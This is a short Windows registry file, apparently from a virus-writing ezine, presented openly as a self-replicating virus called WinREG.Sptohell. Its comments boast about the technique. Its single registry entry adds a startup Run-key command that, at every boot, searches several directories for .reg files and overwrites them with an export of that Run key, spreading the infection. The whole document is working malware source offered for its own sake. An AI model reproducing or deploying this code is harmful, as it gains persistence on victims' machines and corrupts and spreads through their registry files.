REGEDIT 4

;; ***************  --> WinREG.Sptohell <-- + + + --> by Second Part To Hell [rRlf] <--  ***************
;; 
;; You may ask: "Why do I write such an nonsence virus?"! +fg+ The reason is, that I have nerver seen such an virus
;; in any ezine before. And I think, much ppl don't know, that such viruses exist.
;;
;; The virus itself is fuckin easy. First it copies itself to the Registry, so the code will started by every
;; start of the computer. The code searchs for every *.reg file in 4 directories. If it finds some, it copies
;; itself (the code in the registry) to these .REG-files.


[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\]
@="command /c for %q in (%windir%\*.reg %path%\*.reg C:\*.reg %windir%\system\*.reg) do regedit /e %q HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"